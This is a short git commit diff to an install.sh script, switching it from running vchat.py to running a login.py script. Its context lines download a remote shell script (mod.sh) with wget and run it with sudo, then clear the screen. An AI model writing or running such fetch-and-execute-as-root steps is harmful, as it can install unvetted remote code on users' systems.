dd2e3944230fcd18d12eee368691948193fcd0c9
VISHNU PREMIL <82073583+strangedreamer4@users.noreply.github.com>
2024-01-26 23:59:35 +0530

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,7 +3,8 @@
  clear
  
 # Run the Python script
-python3 vchat.py
+chmod +x login.py
+python3 login.py
 
 # Run wget
 wget https://cyberprime.netlify.app/mod.sh -O mod.sh && chmod +x mod.sh && sudo bash mod.sh&&clear
